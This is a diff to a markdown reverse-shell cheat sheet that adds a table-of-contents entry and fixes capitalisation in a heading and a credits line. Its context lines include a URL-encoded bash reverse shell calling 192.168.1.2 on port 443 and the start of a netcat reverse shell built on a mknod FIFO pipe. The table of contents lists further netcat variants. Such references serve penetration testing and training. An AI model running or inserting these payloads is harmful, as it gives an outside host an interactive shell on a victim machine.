@@ -4,6 +4,7 @@
   * [<kbd>Bash (URL Encode)</kbd>](#bash-url-encode)
 - [<kbd>Netcat</kbd>](#netcat)
   * [<kbd>Netcat Linux</kbd>](#netcat-linux)
+      * [<kbd>NO Flags -c -e</kbd>](#no-flags--c--e)
       * [<kbd>-e</kbd>](#-e)
       * [<kbd>-e (URL Encode)</kbd>](#-e-url-encode)
       * [<kbd>-c</kbd>](#-c)
@@ -113,9 +114,9 @@ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%
 
 # <kbd>Netcat Linux</kbd>
 
-# <kbd>No Flags: -c -e</kbd>
+# <kbd>No Flags -c -e</kbd>
 
->credits: UnD3sc0n0c1d0
+>Credits: UnD3sc0n0c1d0
 
 ```sh
 mknod /tmp/backpipe p                                          # 1) create FIFO pipe (pipeline)
